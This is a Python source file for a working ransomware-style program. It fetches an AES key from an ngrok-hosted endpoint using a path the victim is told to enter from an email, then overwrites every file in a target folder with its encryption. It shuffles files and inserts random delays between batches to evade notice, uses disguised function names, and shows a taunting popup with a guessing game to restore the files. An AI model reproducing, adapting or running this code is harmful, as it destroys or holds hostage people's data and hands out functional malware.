import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
from cryptography.hazmat.backends import default_backend
import requests
import tkinter as tk
from tkinter import simpledialog, messagebox
import hashlib
import random
import time
import tkinter as tk
from tkinter import messagebox, simpledialog

mode = "active"

def get_key_from_endpoint(random_path):
    # Construct the key retrieval URL
    key_url = f"https://squirrel-pet-bengal.ngrok-free.app/key/{random_path}"
    try:
        # Fetch the key from the server
        response = requests.get(key_url)
        response.raise_for_status()  # Raise an error for HTTP issues
        raw_key = response.text.strip()  # Ensure no extra spaces or newlines
        hashed_key = hashlib.sha256(raw_key.encode()).digest()[:16]  # Derive a 16-byte key
        return hashed_key
    except Exception as e:
        print(f"Failed to retrieve the key: {e}")
        return None

def run_vector(input_data: bytes, config_token: bytes) -> bytes:
    nonce_seed = os.urandom(12)
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce_seed + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
    output_blob = session.update(input_data) + session.finalize()
    return nonce_seed + output_blob  # return raw binary blob

def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
    nonce = blob[:12]
    ciphertext = blob[12:]
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
    return session.update(ciphertext) + session.finalize()

def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
    # Step 1: Collect and shuffle files
    file_paths = []
    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            file_paths.append(os.path.join(dirpath, asset))
    random.shuffle(file_paths)

    total_files = len(file_paths)
    if total_files == 0:
        print("No files found.")
        return

    # Step 2: Set batch and delay ranges based on file count
    if total_files <= 20:
        min_batch, max_batch = 1, 2
        min_delay, max_delay = 0.2, 0.5
    elif total_files <= 100:
        min_batch, max_batch = 2, 4
        min_delay, max_delay = 0.1, 0.3
    elif total_files <= 500:
        min_batch, max_batch = 4, 8
        min_delay, max_delay = 0.05, 0.2
    else:
        min_batch, max_batch = 6, 12
        min_delay, max_delay = 0.3, 0.7

    # Step 3: Calculate approximate delay budget per batch
    i = 0
    while i < total_files:
        batch_size = random.randint(min_batch, max_batch)
        for _ in range(batch_size):
            if i >= total_files:
                break
            path = file_paths[i]
            try:
                with open(path, 'rb') as f:
                    data = f.read()
                byeBye = run_vector(data, config_token)
                with open(path, 'wb') as f:
                    f.write(byeBye)
                print(f"[{i+1}/{total_files}] bye bye: {path}")
            except Exception:
                print(f"[{i+1}/{total_files}] Failed: {path}")
            i += 1

        delay = random.uniform(min_delay, max_delay)
        print(f"⏳ Delaying batch for {delay:.2f} seconds...\n")
        time.sleep(delay)

def restore_assets(asset_dir: str, config_token: bytes):
    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            asset_path = os.path.join(dirpath, asset)

            try:
                with open(asset_path, 'rb') as f:
                    blob = f.read()

                restored = reverse_vector(blob, config_token)

                with open(asset_path, 'wb') as f:
                    f.write(restored)
            except Exception:
                pass  

def show_popup():
    root = tk.Tk()
    root.withdraw()

    response = messagebox.askquestion(
        "💀 Oops... Files bye bye!",
        "🎉 Surprise! Your precious files are now on vacation — permanently bye bye.\n\n"
        "But hey, I’m feeling generous today...\n"
        "Would you like a *totally fair* chance to win them back?\n\n"
        "Click YES to 'Play a Game'\n"
        "Click NO to 'Lose Everything Like a Legend' 💀"
    )

    if response == "yes":
        play_game()
    else:
        messagebox.showerror("🔥 RIP Files", "Well... you chose doom. Enjoy the silence 💣")
        # exit() or fake "delete" logic here
def play_game():
    global mode  # allows us to update the global `mode`

    correct_answer = "documents"
    tries = 3

    for attempt in range(1, tries + 1):
        guess = simpledialog.askstring(
            "Game Time 🎮",
            f"Guess the name of the folder I hate the most.\n"
            f"Hint: It's something you never backed up.\n"
            f"Attempt {attempt} of {tries}:"
        )
        if guess and guess.lower().strip() == correct_answer:
            messagebox.showinfo("🏆 Bravo!", "Wow. You actually got it. welcoming back will now begin...")
            mode = "restore"  # 🧠 change the mode!
            return
        else:
            messagebox.showwarning("❌ Nope", "Wrong guess. Try again...")

    messagebox.showerror("💀 Game Over", "You failed. The files are bye bye. Forever-ish.")

# === SYSTEM EXECUTION ===
if __name__ == "__main__":
    import time
    resources_folder = "testfolder"       # appears like system logs folder

    root = tk.Tk()
    root.withdraw()  # Hide the main tkinter window

    random_path = simpledialog.askstring("Input Required", "Enter the random path (password) provided in the email:")

    # Retrieve the key using the provided random path
    key = get_key_from_endpoint(random_path)
    print(key)
    if not key:
        messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
        exit(1)

    if mode == "active":
        start = time.time()
        scan_and_patch_assets(resources_folder, key)
        end = time.time()
        print(f"bye bye finished in {end - start:.2f} seconds.")
        show_popup()  # ← may change mode to "restore"

    if mode == "restore":
        restore_assets(resources_folder, key)
        print("Files restored successfully.")